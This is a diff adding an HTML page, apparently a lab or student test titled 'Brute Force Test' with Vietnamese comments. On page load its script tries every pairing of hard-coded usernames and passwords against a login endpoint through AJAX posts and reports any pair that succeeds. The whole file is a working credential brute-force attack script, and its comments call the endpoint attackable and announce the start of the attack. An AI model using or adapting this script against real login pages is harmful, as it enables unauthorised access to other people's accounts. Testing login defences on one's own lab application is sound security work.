@@ -1,0 +1,75 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Brute Force Test</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+    <script>
+        async function bruteForce() {
+            let data;
+            const url = '/lenninlabs/?mod=login'; // url có thể tấn công
+            let usercorrect = '';
+            // giả sử đây sẽ là danh sách tài khoản mật khẩu thường dùng
+            // CO THE CONFIG 1 ACCOUNT DUNG TAI KHOAN PASSWORD DE TEST
+            const usernames = [
+                'adminthien',
+                'dsada',
+                'admin1',
+                'admin2',
+                'admin3',
+                'admin4',
+                'admin5',
+                'admin6',
+                'admin7',
+            ];
+            const passwords = [
+                'thiendz12',
+                'password2',
+                'password3',
+                'password4',
+                'password5',
+                'password5',
+                'password6',
+                'password7',
+                'password8',
+                'password9',
+                'password10',
+                'password11',
+                'password12',
+                '12345678'
+            ];
+            for (let username of usernames) {
+                for (let password of passwords) {
+                    if (usercorrect === username) continue;
+                    await $.ajax({
+                        url: url,
+                        type: "post",
+                        data: {
+                            username: username,
+                            password: password,
+                            login: 's',
+                        },
+                        success: function (response) {
+                            data = response;
+                        },
+                    });
+                    if (data.indexOf('success') !== -1) {
+                        usercorrect = username;
+                        alert(`Đăng nhập thành công tài khoản ${username} với mật khẩu: ${password}`);
+                    } else if (data.indexOf('failed') !== -1) {
+                        console.log(`Đăng nhập thất bại tài khoản ${username} với mật khẩu: ${password}`);
+                    } else {
+                        console.log(`Error request`);
+                    }
+                }
+            }
+
+        }
+
+        // Bắt đầu tấn công brute force
+        bruteForce();
+    </script>
+</body>
+</html>
